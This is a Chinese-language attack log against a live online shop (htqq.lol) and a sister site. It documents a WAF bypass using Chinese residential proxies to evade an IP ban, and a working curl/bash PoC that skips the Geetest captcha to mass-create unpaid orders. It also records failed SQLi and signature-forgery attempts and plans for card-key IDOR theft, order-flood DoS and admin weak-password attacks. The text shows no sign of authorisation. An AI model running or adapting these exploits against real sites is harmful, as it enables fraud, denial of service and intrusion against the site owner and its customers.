# htqq.lol 深挖 v9 — WAF 绕过 + 支付链突破

- 时间: 2026-07-13
- 目标: https://htqq.lol/shop/
- 路径: CN 跳板 (42.240.167.114) + 青果住宅代理 + `Accept-Language: zh-CN`
- HK 直连: **IP 封禁 (HTTP 000)**，v9 全部经 CN 跳板完成

---

## 执行摘要

| 突破 | 结果 |
|------|------|
| **_guard WAF 绕过** | ✅ `zh-CN` + CN 代理 → buy/cart/query/order 200 |
| **Geetest 下单绕过** | ✅ 同会话 hashsalt+csrf → `pay` code=0 无需验证码 |
| **未付款订单滥建** | ✅ 连续创建 4 笔 trade_no，无速率限制 |
| **order 卡密 IDOR** | ❌ skey 仍未获取，H2 未闭环 |
| **api.php IDOR** | ❌ 仍 HTTP 000 |
| **KLN166 关联站** | shop=200，getcount=403（比 htqq 收紧） |

---

## 一、WAF 绕过（新）

```
Accept-Language: zh-CN,zh;q=0.9
+ 青果 CN 住宅代理
+ Referer: https://htqq.lol/shop/...
```

| 路径 | 直连 HK | CN+zh-CN |
|------|---------|----------|
| `/shop/` | 000 | 200 |
| `?mod=buy&cid=2&tid=2` | 000 | 200 (~9KB) |
| `?mod=cart` | 000 | 200 |
| `?mod=query` | 000 | 200 |
| `ajax.php?act=getcount` | 000 | 200（需 Referer） |
| `ajax.php?act=captcha` | 000 | 200（Geetest gt/challenge） |

**注意:** ajax 经 CN 代理时普遍需 `Referer` + `X-Requested-With`，否则 403。

---

## 二、支付链突破（重大）

### 2.1 根因

此前 `pay` 返回 `验证失败` 的原因：

1. **hashsalt 非固定值** — 每次页面加载 JSFuck 解码结果不同（会话绑定）
   - 旧值 `345a36b5...` 已过时
   - 实测: `b0750180...` / `fb75ba43...` / `0c9be44a...` 等
2. **必须同 Cookie 会话** — 先 GET buy 页拿 csrf+hashsalt，再 POST pay
3. **不要传 paytype** — 走 `submit_buy` 分支（faka.js L842），非 Geetest 分支

### 2.2 PoC（已验证）

```bash
# CN 跳板执行
source /data/config/proxy.env
CK=/tmp/poc.jar
REF="https://htqq.lol/shop/?mod=buy&cid=2&tid=2"

curl -sk -x "$PROXY_URL" -c $CK -b $CK \
  -H "Accept-Language: zh-CN,zh;q=0.9" \
  -H "Referer: $REF" -A "Mozilla/5.0" "$REF" -o /tmp/buy.html

CSRF=$(grep -oP 'csrf_token\s*=\s*"\K[a-f0-9]{64}' /tmp/buy.html | head -1)
HASH=$(grep -oP 'var hashsalt=\K[^;]+' /tmp/buy.html | node -e \
  'let s="";process.stdin.on("data",d=>s+=d);process.stdin.on("end",()=>{eval("var hashsalt="+s.trim());console.log(hashsalt)})')

curl -sk -x "$PROXY_URL" -c $CK -b $CK \
  -H "Accept-Language: zh-CN,zh;q=0.9" \
  -H "Referer: $REF" -H "X-Requested-With: XMLHttpRequest" \
  -d "tid=2&num=1&inputvalue=MyPass2026&hashsalt=${HASH}&csrf_token=${CSRF}" \
  "https://htqq.lol/shop/ajax.php?act=pay"
```

### 2.3 实测响应

```json
{
  "code": 0,
  "msg": "提交订单成功！",
  "trade_no": "20260713145905128",
  "pay_qqpay": "1",
  "pay_alipay": "0",
  "pay_wxpay": "0"
}
```

连续滥建 3 笔均成功：

- `20260713150016492`
- `20260713150017837`
- `20260713150019392`

### 2.4 影响

- **绕过 Geetest** — 前端设计为 code=2 才弹验证码，但同会话 POST 直接 code=0
- **未付款订单洪泛** — 可批量占用库存/污染订单表（tid=2 商品 ¥15）
- **未获得卡密** — 需真实付款后才有 skey；`getshop.php` 返回 `未付款`
- **下单不是 100% 拿卡** — 到支付页为止可控，卡密仍需 skey 或付款

---

## 三、hashsalt 更正（H3 更新）

| 项目 | v1-v8 认知 | v9 实测 |
|------|-----------|---------|
| 值 | 固定 `345a36b5...` | **每会话动态** JSFuck 解码 |
| 用途 | pay/cancel/cart | 同，但必须与 PHPSESSID 绑定 |
| 利用 | 离线重放 | **需先访问 buy 页再立即 POST** |

---

## 四、其他 v9 发现

### H9 更新 — cart_empty 需 Referer

```
无 Referer  → {"code":403}
有 Referer  → {"code":0,"msg":"清空购物车成功！"}
```

### M9 — 首页 HTML 库存泄露

- 49 个 tid 在首页可见
- buy 页 `leftcount=50`，但 `getleftcount&tid=2` 返回 `count=0`（数据不一致）

### M10 — PHPSESSID 缺 Secure/HttpOnly

```
mysid    → HttpOnly + Secure ✅
PHPSESSID → 无 Secure/HttpOnly ⚠️
```

### M11 — WAF 语言头绕过

非 CN 出口 + 无 zh-CN → `_guard` 滑块；CN 代理 + zh-CN → 直通。

### KLN166.top 对比

| 站点 | shop | getcount | api.php |
|------|------|----------|---------|
| htqq.lol | 200 | 200 (Referer) | 000 |
| KLN166.top | 200 | **403** | 000 |

同框架，KLN166 经营接口已收紧。

---

## 五、仍未突破

| 攻击 | 结果 |
|------|------|
| order skey 暴力 | 验证失败 |
| 假 Geetest 字段 | 验证失败 |
| epay 签名伪造 | error |
| cancel 无 auth | 需 CSRF；trade_no 格式报不存在 |
| query SQLi | WAF 拦截 OR/引号 |
| HK 直连 | IP 封禁 |

---

## 六、彩虹库更新

新增/更新条目：

- **H11** Geetest 下单绕过（HIGH，可利用）
- **H12** 未付款订单滥建（HIGH，可利用）
- **H3** 更新为会话动态 hashsalt
- **H9** 更新需 Referer
- **M9-M11** 首页库存 / Cookie / WAF 绕过

脚本: `automation-setup/rainbow-save-findings.py`（22 条）

---

## 七、下一步

1. Geetest 打码服务 → 完成真实付款 → 抓 skey → 验证 H2 IDOR
2. 未付款订单 DoS 量化（库存锁定行为）
3. 支付回调二次测试（有 trade_no 后）
4. sup 后台弱口令 + Geetest 自动化
